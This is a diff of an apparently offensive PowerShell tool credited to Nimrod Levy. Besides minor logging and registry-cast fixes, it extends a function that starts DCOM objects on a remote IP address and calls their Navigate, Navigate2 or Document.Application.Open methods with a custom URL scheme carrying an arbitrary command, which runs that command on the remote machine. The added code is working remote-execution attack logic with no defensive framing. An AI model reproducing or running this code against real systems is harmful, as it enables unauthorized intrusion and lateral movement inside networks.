@@ -1,4 +1,4 @@
-﻿<#
+<#
 License: GPL v3
 Author: Nimrod Levy (https://twitter.com/el3ct71k)
 Disclaimer:
@@ -280,6 +280,7 @@ function Start-NamedpipeListener {
     param()
     # This function is responsible to creates a namedpipe client and wait until the server allows our connection
     $global:ps, $global:handle = Start-NamedPipeClient -pipeName $global:NamedPipe
+    Write-Log -Level VERBOSE -Message  "Waiting for interaction between the client and the server via NamedPipe.."
     while($global:Consumer.Count -eq 0) {
         sleep -Milliseconds $global:SleepMilisecondsTime
     }
@@ -1786,7 +1787,7 @@ function Write-RegDWORD {
         if(!$regObj) {
             return $false, "$($Key) key not exists."
         }
-        return $true, $regObj.SetValue($Value, $DWORD)
+        return $true, $regObj.SetValue($Value, [system.Int32]$DWORD)
     } catch {
         return $false, $_
     }
@@ -4267,14 +4268,28 @@ function Invoke-RegisterRemoteSchema {
                     (& $FunctionName @Arguments)|Out-Null
                 }
                 
-
                 $isCommandExecuted = $false
                 foreach($dcom in $DCOMList) {
                     if(Start-COMObjectInstance -ObjectName $dcom -RemoteIP $RemoteIP) {
-                        foreach($NavigationCommand in @("Navigate", "Navigate2")) {
-                            Browse-COMProperty -PropertyName "Navigate"|Out-Null
-                            if(Set-COMProperty -PropertyName "Navigate" -ArgumentList @("$($URLScheme)://$($Command)")) {
-                                Write-Log -Level INFO """$($Command)"" Executed successfully!"
+                        foreach($NavigationFunctionPath in @("Navigate", "Navigate2", "Document.Application.Open")) {
+                            $ObjectPath = ""
+                            $SplittedPath = $NavigationFunctionPath.Split(".")
+                            $FunctionName = $SplittedPath[-1]
+                            $isPathExists = $true
+                            foreach($PropertyName in Skip-LastItem -Array $SplittedPath) {
+                                if(!(Browse-COMProperty -ObjectPath $ObjectPath -PropertyName $PropertyName)) {
+                                    $isPathExists = $false
+                                    break
+                                }
+                                $ObjectPath = Iif -Condition $ObjectPath -Right "$($ObjectPath).$($PropertyName)" -Wrong $PropertyName
+                            }
+
+                            if(!$isPathExists) {
+                                continue
+                            }
+
+                            if(Set-COMProperty -PropertyName $FunctionName -ArgumentList @("$($URLScheme)://$($Command)") -ObjectPath $ObjectPath) {
+                                Write-Log -Level INFO """$($Command)"" Executed successfully (Using $($FunctionName) function)!"
                                 $isCommandExecuted = $true
                                 break
                             }
